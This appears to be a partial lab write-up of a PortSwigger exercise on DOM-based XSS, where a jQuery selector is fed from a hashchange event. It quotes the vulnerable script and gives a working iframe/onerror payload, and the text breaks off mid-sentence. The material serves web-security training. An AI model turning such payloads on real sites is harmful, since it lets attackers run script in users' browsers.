**Lab: DOM XSS in jQuery selector sink using a hashchange event**
<br>
*Link to Lab* https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event
<br><br><br><br><br>
When I entered the lab, I was greeted with a blog hosting website.
<img width="1258" height="965" alt="image" src="https://github.com/user-attachments/assets/5faf13ab-7ced-4c34-916e-32d362114eb0" />
From the lab name, I knew that I was searching for a vulnrability associated with a haschange event. Therefore, I looked through the source code of the websites page looking for something that included ```haschange```.
First I looked through the home page a result showed up in the code snippet:
```
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
```
This meant that all that I had to do was submit this payload:```<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print("Done")>'"> ``` into
